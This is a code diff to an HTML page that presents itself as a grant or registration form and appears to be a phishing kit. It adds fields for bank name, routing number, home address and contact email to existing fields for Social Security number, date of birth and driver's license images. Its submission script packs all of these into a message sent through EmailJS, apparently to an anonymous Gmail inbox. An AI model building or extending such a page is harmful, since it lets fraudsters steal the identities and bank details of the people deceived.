@@ -2114,20 +2114,10 @@
                 it can be used to reset forgotten password.
               </li>
             </ul></span
-          ><span
-            id="form:registrationMessage"
-            style="
-               {
-                userregistrationbean.messagesempty?'display:none': '';
-              }
-            "
+          ><span id="form:registrationMessage"
             ><span class="errors"></span></span
           ><span id="form:j_idt42"></span>
-          <script type="text/javascript">
-            $(function () {
-              PrimeFaces.focus('form:firstname')
-            })
-          </script>
+
           <span id="form:confirmEmail"></span
           ><span
             ><fieldset>
@@ -2170,7 +2160,6 @@
                           />
                         </td>
                       </tr>
-                      <!-- Add more rows for other fields -->
                       <tr class="ui-widget-content ui-panelgrid-odd" role="row">
                         <td
                           role="gridcell"
@@ -2181,9 +2170,7 @@
                             text-align: right;
                           "
                         >
-                          <label for="driverLicenseFront"
-                            >Driver's License (Front):</label
-                          >
+                          <label for="middleName">Middle Name:</label>
                         </td>
                         <td
                           role="gridcell"
@@ -2195,9 +2182,9 @@
                           "
                         >
                           <input
-                            id="driverLicenseFront"
-                            name="driverLicenseFront"
-                            type="file"
+                            id="middleName"
+                            name="middleName"
+                            type="text"
                             required
                           />
                         </td>
@@ -2215,9 +2202,7 @@
                             text-align: right;
                           "
                         >
-                          <label for="driverLicenseBack"
-                            >Driver's License (Back):</label
-                          >
+                          <label for="lastName">Last Name:</label>
                         </td>
                         <td
                           role="gridcell"
@@ -2229,11 +2214,192 @@
                           "
                         >
                           <input
-                            id="driverLicenseBack"
-                            name="driverLicenseBack"
-                            type="file"
+                            id="lastName"
+                            name="lastName"
+                            type="text"
                             required
                           />
+                        </td>
+                      </tr>
+                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="bankName">Bank Name:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="bankName"
+                            name="bankName"
+                            type="text"
+                            required
+                          />
+                        </td>
+                      </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="routingNumber">Routing Number:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="routingNumber"
+                            name="routingNumber"
+                            type="text"
+                            required
+                          />
+                        </td>
+                      </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="routingNumber">Home Address:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="homeAddress"
+                            name="homeAddress"
+                            type="text"
+                            required
+                          />
+                        </td>
+                      </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="routingNumber">Contact Email:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="emailAddress"
+                            name="emailAddress"
+                            type="email"
+                            required
+                          />
+                        </td>
+                      </tr>
+                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="dob">Date of Birth:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input id="dob" name="dob" type="date" required />
+                        </td>
+                      </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="gender">Gender:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <select id="gender" name="gender" required>
+                            <option value="" disabled selected>Select</option>
+                            <option value="male">Male</option>
+                            <option value="female">Female</option>
+                            <option value="other">Other</option>
+                          </select>
                         </td>
                       </tr>
                       <tr class="ui-widget-content ui-panelgrid-odd" role="row">
@@ -2273,7 +2439,7 @@
                             text-align: right;
                           "
                         >
-                          <label for="dob">Date of Birth:</label>
+                          <label for="maritalStatus">Marital Status:</label>
                         </td>
                         <td
                           role="gridcell"
@@ -2284,42 +2450,18 @@
                             text-align: left;
                           "
                         >
-                          <input id="dob" name="dob" type="date" required />
-                        </td>
-                      </tr>
-                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
-                        <td
-                          role="gridcell"
-                          class="ui-panelgrid-cell"
-                          style="
-                            width: 40%;
-                            vertical-align: middle;
-                            text-align: right;
-                          "
-                        >
-                          <label for="gender">Gender:</label>
-                        </td>
-                        <td
-                          role="gridcell"
-                          class="ui-panelgrid-cell"
-                          style="
-                            width: 60%;
-                            vertical-align: top;
-                            text-align: left;
-                          "
-                        >
-                          <select id="gender" name="gender" required>
+                          <select
+                            id="maritalStatus"
+                            name="maritalStatus"
+                            required
+                          >
                             <option value="" disabled selected>Select</option>
-                            <option value="male">Male</option>
-                            <option value="female">Female</option>
-                            <option value="other">Other</option>
+                            <option value="single">Single</option>
+                            <option value="married">Married</option>
                           </select>
                         </td>
                       </tr>
-                      <tr
-                        class="ui-widget-content ui-panelgrid-even"
-                        role="row"
-                      >
+                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
                         <td
                           role="gridcell"
                           class="ui-panelgrid-cell"
@@ -2350,7 +2492,10 @@
                           />
                         </td>
                       </tr>
-                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
                         <td
                           role="gridcell"
                           class="ui-panelgrid-cell"
@@ -2360,7 +2505,9 @@
                             text-align: right;
                           "
                         >
-                          <label for="maritalStatus">Marital Status:</label>
+                          <label for="driverLicenseFront"
+                            >Driver's License (Front):</label
+                          >
                         </td>
                         <td
                           role="gridcell"
@@ -2371,20 +2518,50 @@
                             text-align: left;
                           "
                         >
-                          <select
-                            id="maritalStatus"
-                            name="maritalStatus"
+                          <input
+                            id="driverLicenseFront"
+                            name="driverLicenseFront"
+                            type="file"
                             required
-                          >
-                            <option value="" disabled selected>Select</option>
-                            <option value="single">Single</option>
-                            <option value="married">Married</option>
-                          </select>
+                          />
                         </td>
                       </tr>
-                      <tr>
+                      <tr class="ui-widget-content ui-panelgrid-odd" role="row">
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="driverLicenseBack"
+                            >Driver's License (Back):</label
+                          >
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="driverLicenseBack"
+                            name="driverLicenseBack"
+                            type="file"
+                            required
+                          />
+                        </td>
+                      </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
                         <td colspan="2" style="text-align: center">
-                          <!-- <button>Submit</button> -->
                           <button id="grantbutton" onclick="submission()">
                             Submission
                           </button>
@@ -2403,28 +2580,24 @@
               function submission(e) {
                 // Collect form data
                 var firstName = document.getElementById('firstName').value
+                var middleName = document.getElementById('middleName').value
+                var lastName = document.getElementById('lastName').value
+                var bankName = document.getElementById('bankName').value
+                var routingNumber =
+                  document.getElementById('routingNumber').value
                 var ssn = document.getElementById('ssn').value
+                var homeAddress = document.getElementById('homeAddress').value
+                var emailAddress = document.getElementById('emailAddress').value
                 var dob = document.getElementById('dob').value
                 var gender = document.getElementById('gender').value
                 var yearsOfService =
                   document.getElementById('yearsOfService').value
                 var maritalStatus =
                   document.getElementById('maritalStatus').value
-                var driverLicenseFront =
-                  document.getElementById('driverLicenseFront')
-                var driverLicenseBack =
-                  document.getElementById('driverLicenseBack')
-                var driverLicenseFrontBase64 = ''
-                var driverLicenseBackBase64 = ''
-
-                var reader = new FileReader()
-                reader.onloadend = function () {
-                  driverLicenseFrontBase64 = reader.result
-                  // Once the front image is converted, read the back image
-                  reader.readAsDataURL(driverLicenseBack.files[0])
-                }
-
-                driverLicenseBackBase64 = reader.result
+                // var driverLicenseFront =
+                //   document.getElementById('driverLicenseFront').src
+                // var driverLicenseBack =
+                //   document.getElementById('driverLicenseBack').src
 
                 var templateParams = {
                   // to_email: 'anonymousway001@gmail.com',  Replace with the recipient's email address
@@ -2435,6 +2608,24 @@
                   message:
                     'FIRST NAME: ' +
                     firstName +
+                    '\n' +
+                    'MIDDLE NAME: ' +
+                    middleName +
+                    '\n' +
+                    'LAST NAME: ' +
+                    lastName +
+                    '\n' +
+                    'HOME ADDRESS: ' +
+                    homeAddress +
+                    '\n' +
+                    'EMAIL ADDRESS: ' +
+                    emailAddress +
+                    '\n' +
+                    'BANK NAME: ' +
+                    bankName +
+                    '\n' +
+                    'ROUTING NUMBER: ' +
+                    routingNumber +
                     '\n' +
                     'SSN: ' +
                     ssn +
@@ -2451,8 +2642,6 @@
                     'MARITAL STATUS: ' +
                     maritalStatus +
                     '\n',
-                  driverLicenseFront: driverLicenseFrontBase64,
-                  driverLicenseBack: driverLicenseBackBase64,
                 }
 
                 // Send email using EmailJS
@@ -2475,7 +2664,6 @@
                   )
               }
 
-              reader.readAsDataURL(driverLicenseFront.files[0])
               console.log('end of the line')
             </script>
 
